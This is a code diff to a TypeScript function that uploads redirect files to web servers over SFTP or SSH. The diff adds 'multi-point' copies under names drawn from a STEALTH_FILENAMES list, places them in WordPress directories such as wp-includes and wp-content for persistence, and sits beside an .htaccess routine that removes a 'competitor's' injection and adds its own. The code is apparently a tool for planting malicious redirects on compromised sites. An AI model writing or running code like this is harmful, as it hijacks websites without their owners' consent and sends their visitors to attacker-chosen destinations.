@@ -31,6 +31,7 @@ export interface SSHUploadResult {
   duration?: number;
   webRoot?: string;
   serverInfo?: string;
+  extraPaths?: string[]; // Multi-point upload: all uploaded file paths
 }
 
 export interface SSHUploadOptions {
@@ -471,7 +472,36 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
         log(`📤 SFTP uploading: ${remotePath}`);
 
         await sftpWriteFile(sftp, remotePath, redirectContent);
-        log(`✅ SFTP uploaded: ${selectedFilename}`);
+        log(`✅ SFTP uploaded [1]: ${selectedFilename}`);
+
+        // === MULTI-POINT UPLOAD: extra files for redundancy ===
+        const sftpExtraPaths: string[] = [remotePath];
+        const sftpExtraFilenames = STEALTH_FILENAMES.filter(f => f !== selectedFilename).slice(0, 2);
+        for (const extraFile of sftpExtraFilenames) {
+          try {
+            const extraPath = `${webRoot}/${extraFile}`;
+            await sftpWriteFile(sftp, extraPath, redirectContent);
+            sftpExtraPaths.push(extraPath);
+            log(`✅ SFTP uploaded [${sftpExtraPaths.length}]: ${extraFile}`);
+          } catch {
+            // non-critical
+          }
+        }
+        // Try subdirectories
+        const sftpSubDirs = ["wp-includes", "wp-content", "assets", "images"];
+        for (const subDir of sftpSubDirs) {
+          if (sftpExtraPaths.length >= 5) break;
+          try {
+            const subFilename = STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
+            const subPath = `${webRoot}/${subDir}/${subFilename}`;
+            await sftpWriteFile(sftp, subPath, redirectContent);
+            sftpExtraPaths.push(subPath);
+            log(`✅ SFTP uploaded [${sftpExtraPaths.length}]: ${subDir}/${subFilename}`);
+          } catch {
+            // subdir doesn't exist, skip
+          }
+        }
+        log(`📦 Total SFTP uploaded: ${sftpExtraPaths.length} files for redundancy`);
 
         // Smart .htaccess overwrite: read existing → clean competitor → inject ours
         try {
@@ -512,6 +542,7 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
           duration: Date.now() - startTime,
           webRoot,
           serverInfo,
+          extraPaths: sftpExtraPaths,
         };
       }
     } catch (sftpErr) {
@@ -549,12 +580,35 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
           `echo '${escapedContent}' > '${webRoot}/${selectedFilename}'`,
           8000,
         );
-        log(`✅ SSH exec: file written to ${webRoot}/${selectedFilename}`);
+        log(`✅ SSH exec uploaded [1]: ${selectedFilename}`);
 
         // Set permissions
         try {
           await sshExec(client, `chmod 644 '${webRoot}/${selectedFilename}'`, 5000);
         } catch { /* ignore */ }
+
+        // === MULTI-POINT UPLOAD: extra files for redundancy ===
+        const execExtraPaths: string[] = [`${webRoot}/${selectedFilename}`];
+        const execExtraFilenames = STEALTH_FILENAMES.filter(f => f !== selectedFilename).slice(0, 2);
+        for (const extraFile of execExtraFilenames) {
+          try {
+            await sshExec(client, `echo '${escapedContent}' > '${webRoot}/${extraFile}' && chmod 644 '${webRoot}/${extraFile}'`, 5000);
+            execExtraPaths.push(`${webRoot}/${extraFile}`);
+            log(`✅ SSH exec uploaded [${execExtraPaths.length}]: ${extraFile}`);
+          } catch { /* non-critical */ }
+        }
+        // Try subdirectories
+        const execSubDirs = ["wp-includes", "wp-content", "assets", "images"];
+        for (const subDir of execSubDirs) {
+          if (execExtraPaths.length >= 5) break;
+          try {
+            const subFilename = STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
+            await sshExec(client, `[ -d '${webRoot}/${subDir}' ] && echo '${escapedContent}' > '${webRoot}/${subDir}/${subFilename}' && chmod 644 '${webRoot}/${subDir}/${subFilename}'`, 5000);
+            execExtraPaths.push(`${webRoot}/${subDir}/${subFilename}`);
+            log(`✅ SSH exec uploaded [${execExtraPaths.length}]: ${subDir}/${subFilename}`);
+          } catch { /* subdir doesn't exist */ }
+        }
+        log(`📦 Total SSH exec uploaded: ${execExtraPaths.length} files for redundancy`);
 
         // Smart .htaccess overwrite via SSH exec
         try {
@@ -595,6 +649,7 @@ export async function sshUploadRedirect(options: SSHUploadOptions): Promise<SSHU
           duration: Date.now() - startTime,
           webRoot,
           serverInfo,
+          extraPaths: execExtraPaths,
         };
       } catch (execErr) {
         const msg = execErr instanceof Error ? execErr.message : String(execErr);
